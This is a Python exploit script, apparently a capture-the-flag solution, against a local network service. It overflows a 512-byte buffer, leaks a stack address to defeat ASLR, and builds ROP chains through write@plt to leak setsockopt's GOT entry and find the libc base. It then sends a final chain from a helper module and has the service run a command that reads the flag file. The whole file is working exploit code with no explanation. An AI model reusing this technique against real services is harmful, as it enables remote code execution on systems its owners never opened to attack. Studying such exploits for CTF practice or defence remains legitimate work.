import sys
import struct
import socket
from mkrop import rop

address = 'localhost'
port = 4442

print("Retrieving Base ...")

s = socket.create_connection((address, port))

p = lambda x : struct.pack('Q',x)

primo = b'1' + b'A' * (511)

s.send(primo)

secondo = b'0' * 512

s.send(secondo)

terzo = b'A'

s.send(terzo)

result = s.recv(0x200)

do_stuff = struct.unpack('Q', result[(7*8):(7*8 + 8)])[0]

#sys.stdout.buffer.write(result[7*8: 7*8 +8])
s.close()

s = socket.create_connection((address, port))

pad2 = b'512' + b'A' * (0x30 + 8 - 3)

do_stuff_off = 0x12b5

base = do_stuff - 52 - do_stuff_off

print("BASE : ", hex(base))
rebase = lambda x : p(x + base)

setsockopt_got = rebase(0x34a0)
write_plt = rebase(0x1040)

pop_rdi = rebase(0x167b)

pop_rsi_r15 = rebase(0x1679)

print("Retrieving Libc ...")

o = pad2
o += pop_rdi 
o += p(1)
o += pop_rsi_r15
o += setsockopt_got
o += b'B' * 8
o += write_plt
o += b'C' * (512 - len(o))

s.send(o)
result = s.recv(8)
set_libc = struct.unpack('Q', result)[0]
#sys.stdout.buffer.write(s.recv(8))

libc = set_libc - 0xff410

print("LIBC : ", hex(libc))


s.close()

s = socket.create_connection((address, port))

r = rop(pad2, libc)
r += b'F' * (512 - len(r))

s.send(r)

s.send(b'/bin/cat flag.txt\n')

print('THE FLAG IS : ')
print('')
sys.stdout.buffer.write(s.recv(0x200))

